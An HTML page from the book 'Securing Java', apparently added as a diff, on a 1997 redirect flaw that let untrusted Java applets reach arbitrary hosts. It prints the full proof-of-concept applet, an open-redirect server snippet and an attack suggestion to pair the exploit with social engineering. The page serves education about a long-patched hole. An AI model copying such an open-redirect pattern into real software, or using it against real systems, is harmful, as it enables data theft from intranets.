@@ -1,0 +1,249 @@
+<html>
+<head>
+<title>Look Over There (Ch. 5, Sec. 18) [Securing Java]</title>
+<META NAME="description" CONTENT="Securing Java: Getting Down to Business with Mobile Code.  This is the online version of the print book, featuring a searchable index, java links, and the full text of the book."> 
+
+<META NAME="keywords" CONTENT="java security,mobile code,sandbox,applets,smart cards,Gary McGraw,Edward Felten">
+
+</head>
+<body background="..\images\back-poss.jpg" bgcolor="#FFFFFF" text="#37371C" link="#FF0000" vlink="#820000" alink="#008080">
+
+<center>
+<table width="90%" bgcolor="#F5F5F5" cellspacing=0 cellpadding=0>
+<tr><td> 
+<a href="..\order.html"><img src="..\images\buyit.gif" width=100 height=45 border=0 alt="BUY IT!"></a>
+
+<center>
+
+
+<img src="..\images\chapt-five.gif" width=593 height=63 border=0 alt="Securing Java">
+</center>
+<br clear=all>
+<center>
+<table border=0 width=100%><tr><td width=60 align=center>
+<a href="chapter-five-17.html">
+<img src="..\images\arrow6.gif" width=60 height=60 border=0 align="middle" alt="Previous Page"><br>
+<font size="-2" face="Helvetica,sans-serif">Previous Page</font></a>
+</td><td align=center><font size="+2" color="#000000"><b>Attack Applets: Exploiting Holes in the Security Model
+</b></font><br>
+
+<b>CHAPTER SECTIONS:</b> <a href="chapter-five-1.html">1</a> / <a href="chapter-five-2.html">2</a> / <a href="chapter-five-3.html">3</a> / <a href="chapter-five-4.html">4</a> / <a href="chapter-five-5.html">5</a> / <a href="chapter-five-7.html">6</a> / <a href="chapter-five-7.html">7</a> / <a href="chapter-five-8.html">8</a> / <a href="chapter-five-9.html">9</a> / <a href="chapter-five-10.html">10</a> / <a href="chapter-five-11.html">11</a> / <a href="chapter-five-12.html">12</a> / <a href="chapter-five-13.html">13</a> / <a href="chapter-five-14.html">14</a> / <a href="chapter-five-15.html">15</a> / <a href="chapter-five-16.html">16</a> / <a href="chapter-five-17.html">17</a> / <b>18</b> / <a href="chapter-five-19.html">19</a> / <a href="chapter-five-20.html">20</a><p>
+
+<font size="+2" color="#000000"><b>Section 18 -- Look Over There</b></font>
+</td><td width=60 align=center>
+<a href="chapter-five-19.html">
+<img src="..\images\arrow7.gif" width=60 height=60 border=0 align="middle" alt="Next Page"><br>
+<font size="-2" face="Helvetica,sans-serif">Next Page</font></a>
+</td></tr></table>
+</center><p>
+
+
+In August of 1997, Ben Mesander, a professional programmer and consultant from Creative Concepts in Boulder, Colorado, uncovered a security hole that allowed untrusted Java applets the ability to make network connections to arbitrary locations. This flaw affected browsers with VMs coded to the JDK 1.0.2 specification. According to the JDK 1.0.2 security model, applets are not allowed to make network connections to any host other than the Web server from which they come. Three browsers-HotJava, Netscape, and MSIE-were all susceptible to the problem (at least with some proxy configurations, as we explain later).<p>
+
+To demonstrate the flaw, which was most apparent in the MSIE implementation of Java, Mesander wrote a simple applet that was able to load a graphic from www.microsoft.com even though the applet was not hosted from that server. The ability to open arbitrary connections to other servers is distressing for several reasons. The first is that such a connection provides a channel for indirect attacks. That is, a bad guy can cause your browser to run an attack against another server, making your machine take the blame. Another is that information from your machine may be siphoned off to another site. A third is that some attack code could be fetched from another location, leaving the true culprit applet in a less-suspicious situation should a successful attack be carried out against your machine. Finally, and most realistically in terms of the example we will show later, the attack applet is able to download an image from any Web server, even those servers behind firewalls. If you have images on your intranet that should not be seen by people outside your organization (such as sales data with sensitive pricing information), the seriousness of the attack is apparent. In any case, it is clear that Mesander's applet was able to do something that should not be allowed.<p>
+
+The applet itself is shown as Listing 5.1. Mesander serves up this "test applet" as an example on his Demo of Browser Security Hole page at <a href="http://neurosis.hungry.com/~ben/">neurosis.hungry.com/~ben/</a>. The applet attempts to load a graphic from a disallowed site (Microsoft's Web site). The applet is able to determine its level of success and display a message relating to the security of your browser.<p>
+
+Listing 5.1  Ben Mesander's applet WhereDoYouWantToGoToday fetches an image from a disallowed location.<p>
+
+<center><table width=85% border=0><tr><td>
+<pre>// ben@gnu.ai.mit.edu
+import java.applet.*;
+import java.awt.*;
+import java.net.*;
+
+class WhereDoYouWantToGoToday extends Canvas
+{
+ Image image = null;
+ WhereDoYouWantToGoToday (Image image)
+ {
+ super ();
+ this.image = image;
+ }
+
+ public void paint (Graphics g)
+ {
+ g.drawImage (image, 0, 0, this);
+ }
+
+ public Dimension preferredSize ()
+ {
+ return new Dimension (image.getWidth (this), image.getHeight (this));
+ }
+
+ public Dimension minimumSize ()
+ {
+ return preferredSize ();
+ }
+}
+
+public class example0 extends Applet
+{
+ private Button b;
+ public void init ()
+ {
+ createUI ();
+ }
+ private void createUI ()
+ {
+ setLayout (new BorderLayout ());
+ b = new Button ("Go!");
+ add ("West", b);
+ }
+
+ public boolean action (Event evt, Object arg)
+ {
+ if (evt.target.equals (b))
+ {
+     try
+      {
+      Image i = getImage (new URL (getDocumentBase (), 
+      "cgi-bin/redirect?where=" + URLencode
+      ("www.microsoft.com/library/images/gifs/
+      homepage/tagline.gif")));
+      MediaTracker tracker = new MediaTracker (this);
+      tracker.addImage (i, 0);
+      tracker.waitForID (0);
+      if (i.getWidth (this) == -1)
+      add ("Center", new TextField ("Browser did not get exception,
+            but image did not load"));
+      else
+      {
+          add ("Center", new WhereDoYouWantToGoToday (i));
+          add ("East", new TextField ("Your browser is not secure."));
+      }
+      validate ();
+      }
+     catch (Exception e)
+      {
+      add ("Center", new TextField ("Exception while fetching image:"
+           + e));
+      validate ();
+      }
+     return true;
+ }
+ return super.action (evt, arg);
+ }
+
+ private static String URLencode (String s) {
+ int i; StringBuffer b = new StringBuffer ();
+ for (i=0; i &lt; s.length () ; ++i)
+ {
+     b.append (URLencode_helper ((char) (s.charAt (i) &amp; 0xff)));
+ }
+ return b.toString ();
+ }
+
+ private static String URLencode_helper (char c)
+ {
+ if (c %lt; 16) {
+ return "%0" + Integer.toString (c, 16);
+ } else if ((c &lt; 32) || (c &gt; 127) || (" +&amp;=%/~#".indexOf (c) >= 0)) {
+ return "%" + Integer.toString (c, 16);
+ } else {
+ return String.valueOf (c);
+ }
+ }
+}</pre>
+</td></tr></table></center><p>
+
+The applet works in concert with an HTTP redirect call that the browser being attacked follows to wherever it leads. Most of the dirty work takes place in the line:<p>
+
+<center>
+<font face="Courier New">Image i = getImage (new URL (getDocumentBase (), "cgi-bin/redirect?where=" + URLencode ("www.microsoft.com/ library/images/gifs/homepage/tagline.gif")));</font>
+</center>
+<p>
+
+Having your Web server implement the redirect command is very simple. With the Microsoft IIS server, the code is as simple as: <p>
+
+<center>
+<pre>Response.Redirect("http://" & Request.QueryString("where")).</pre>
+</center>
+<p>
+
+This applet demonstrated flaws in the Java implementations of several browsers. In particular, results before the browsers were patched showed the following vulnerabilities:
+<UL>
+	<LI>MSIE browsers on all versions of Windows had a serious bug, which Microsoft took very seriously and released a patch for within several days of the bug's discovery.
+	<LI>Netscape browsers were susceptible only if they were set up to use an HTTP proxy server. In particular, proxies set up to work outside the firewall caused big problems. Netscape fixed the bug in later releases of their browser.
+	<LI>The HotJava browser allowed classes to be loaded via redirects, but did not allow images to be loaded this way.
+</UL>
+
+It is important to emphasize that this is a very clear example of an implementation bug and not a design problem. Java's design at the time was such that redirects were rendered impotent as an attack mechanism. However, all the vendors (including Sun's HotJava team) did not properly implement the design.<p>
+
+Another important point is that the attacker must know the URL of the image or class file that is being indirectly fetched. Sometimes, getting this information is not possible. Other times, standardized naming conventions constrain the space of possible names enough that a good guess works. A good attack strategy would be to combine this exploit with a standard social engineering attack that is used to determine the name of the image file or class file to steal.<p><br>
+
+
+<center><font size="+1"><b>Last, But Not Least</b></font></center><p>
+
+Mesander's redirect exploit was the last Java-related problem discovered in JDK 1.0.2 and JDK 1.1. In fact, Java experienced a calm period of several months before the next serious hole was discovered in July of 1998. The timing of these flaws supports the observations that discovery of holes tends to be clustered around major releases and that eventually a majority of the holes are found and fixed.<p>
+
+
+<center>
+<table width=95%>
+<tr>
+<td width=60 align=center>
+<a href="chapter-five-17.html">
+<img src="..\images\arrow6.gif" width=60 height=60 border=0 align="middle" alt="Previous Page"><br>
+<font size="-2" face="Helvetica,sans-serif">Previous Page</font></a>
+</td><td align=center>
+<center>
+<FORM METHOD=post ACTION="/cgi-bin/texis/webinator/newsearch/">
+<font size="-1" face="Helvetica">
+<INPUT TYPE="text" NAME="arg" SIZE=25></font><br>
+<INPUT TYPE="hidden" NAME=proximity VALUE="rank">
+<INPUT TYPE="hidden" NAME=suffixproc VALUE="max">
+<INPUT TYPE="hidden" NAME="db" value="db9">
+<INPUT NAME=cmd TYPE=submit VALUE="Search the Book"><br>
+<font size="-1" face="Arial">
+<a href="http://www.rstcorp.com/searchhelp.html">Search Help</a></font></FORM>
+</center>
+
+</td><td width=60 align=center>
+<a href="chapter-five-19.html">
+<img src="..\images\arrow7.gif" width=60 height=60 border=0 align="middle" alt="Next Page"><br>
+<font size="-2" face="Helvetica,sans-serif">Next Page</font></a>
+</td></tr></table>
+</center>
+
+<hr>
+<p><br>
+
+<map name="menu">
+<area shape="RECT" coords="4,16,116,35" href="..\toc.html">
+<area shape="RECT" coords="11,37,105,57" href="..\preface.html">
+<area shape="RECT" coords="198,13,218,50" href="..\chapter-one\index.html">
+<area shape="RECT" coords="226,12,248,41" href="..\chapter-two\index.html">
+<area shape="RECT" coords="253,17,274,50" href="..\chapter-three\index.html">
+<area shape="RECT" coords="279,27,301,59" href="..\chapter-four\index.html">
+<area shape="RECT" coords="308,16,329,49" href="index.html">
+<area shape="RECT" coords="335,9,357,41" href="..\chapter-six\index.html">
+<area shape="RECT" coords="362,17,381,48" href="..\chapter-seven\index.html">
+<area shape="RECT" coords="387,27,410,59" href="..\chapter-eight\index.html">
+<area shape="RECT" coords="414,17,438,50" href="..\chapter-nine\index.html">
+<area shape="RECT" coords="519,11,593,32" href="..\..\www.securingjava[1].com\index.html">
+<area shape="RECT" coords="538,36,593,58" href="..\help.html">
+</map>
+
+<center>
+<img src="..\images\menumap3.gif" width=600 height=75 border=0 alt="Menu Map -- Text links below" usemap="#menu" ismap><p>
+<font size="-1" face="Helvetica,Arial">
+Chapter... <a href="..\preface.html">Preface</a> -- <a href="..\chapter-one\index.html">1</a> -- <a href="..\chapter-two\index.html">2</a> -- <a href="..\chapter-three\index.html">3</a> -- <a href="..\chapter-four\index.html">4</a> -- <a href="index.html">5</a> -- <a href="..\chapter-six\index.html">6</a> -- <a href="..\chapter-seven\index.html">7</a> -- <a href="..\chapter-eight\index.html">8</a> -- <a href="..\chapter-nine\index.html">9</a> -- <a href="..\appdx-a\index.html">A</a> -- <a href="..\appdx-b\index.html">B</a> -- <a href="..\appdx-c\index.html">C</a> -- <a href="..\references\index.html">Refs</a><br>
+
+<a href="..\..\www.securingjava[1].com\index.html">Front</a> -- <a href="..\toc.html">Contents</a> -- <a href="..\help.html">Help</a>
+</font>
+</center>
+
+<p align=right>
+<font size="-7" face="Helvetica,Arial,sans-serif">
+Copyright &copy;1999 Gary McGraw and Edward Felten.<br>
+All rights reserved.<br>
+Published by <a href="http://www.wiley.com/">John Wiley &amp; Sons, Inc.</a>
+</font>
+
+</td>
+</tr></table>
+
+
+</body>
+</html>
+
